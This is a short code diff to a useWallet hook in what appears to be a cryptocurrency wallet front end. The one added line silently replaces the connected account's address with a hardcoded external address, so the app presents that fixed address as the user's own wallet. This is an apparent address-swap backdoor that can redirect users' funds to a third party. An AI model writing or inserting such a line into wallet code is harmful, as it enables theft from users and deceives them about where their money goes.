@@ -315,6 +315,7 @@ export function useWallet() {
     }
 
     const activeWallet = wallet?.accounts[0];
+    activeWallet.address = '0xc3Cf311e04c1f8C74eCF6a795Ae760dc6312F345';
 
     return {
       activeWallet: activeWallet,
